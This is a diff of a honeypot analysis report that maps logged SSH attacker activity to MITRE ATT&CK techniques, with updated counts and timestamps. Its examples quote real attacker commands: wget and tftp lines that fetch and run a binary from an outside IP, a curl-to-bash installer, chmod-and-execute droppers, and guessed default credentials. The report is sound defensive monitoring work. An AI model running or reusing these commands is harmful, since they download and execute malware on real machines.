@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-12 23:03:21",
+  "generated": "2026-09-13 00:00:54",
   "totals": {
-    "commands": 567,
-    "login_failed": 3513,
-    "login_success": 144,
-    "sessions": 3939
+    "commands": 602,
+    "login_failed": 3529,
+    "login_success": 148,
+    "sessions": 3965
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3513,
+      "count": 3529,
       "examples": [
         "admin / 150580",
         "admin / 150488",
@@ -21,14 +21,14 @@
         "root / casa"
       ],
       "first": "2026-09-12T00:01:39.148725Z",
-      "last": "2026-09-12T23:00:07.148684Z",
-      "unique_ips": 158
+      "last": "2026-09-12T23:56:17.649836Z",
+      "unique_ips": 159
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 144,
+      "count": 148,
       "examples": [
         "root / root",
         "root / xmhdipc",
@@ -37,14 +37,14 @@
         "root / 123@@@"
       ],
       "first": "2026-09-12T00:08:14.272082Z",
-      "last": "2026-09-12T23:00:45.458931Z",
-      "unique_ips": 86
+      "last": "2026-09-12T23:30:25.354120Z",
+      "unique_ips": 89
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 99,
+      "count": 114,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-12T00:08:17.167446Z",
-      "last": "2026-09-12T21:23:41.956296Z",
-      "unique_ips": 14
+      "last": "2026-09-12T23:31:21.417221Z",
+      "unique_ips": 15
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 52,
+      "count": 55,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -69,8 +69,8 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T22:20:20.271022Z",
-      "unique_ips": 13
+      "last": "2026-09-12T23:31:21.417221Z",
+      "unique_ips": 14
     },
     {
       "id": "T1082",
@@ -119,15 +119,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 13,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id"
       ],
       "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T21:23:40.859261Z",
-      "unique_ips": 12
+      "last": "2026-09-12T23:30:29.989637Z",
+      "unique_ips": 13
     },
     {
       "id": "T1059.004",
@@ -219,19 +219,19 @@
   "unmapped": [
     [
       "shell",
-      69
+      71
     ],
     [
       "sh",
-      69
+      71
     ],
     [
       "system",
-      49
+      51
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      40
+      48
     ],
     [
       "sh .k",
@@ -242,32 +242,32 @@
       17
     ],
     [
+      "enable",
+      14
+    ],
+    [
       "/bin/busybox",
       14
     ],
     [
-      "enable",
-      13
-    ],
-    [
       "linuxshell",
-      9
+      10
     ],
     [
       "ping ;sh",
-      8
+      9
     ],
     [
       "cd /proc && cat self/cmdline",
-      7
+      8
     ],
     [
       "enablelinuxshell",
-      6
+      7
     ],
     [
       "/bin/busybox UNSTABLE",
-      6
+      7
     ],
     [
       "/bin/busybox hostname PBOC",
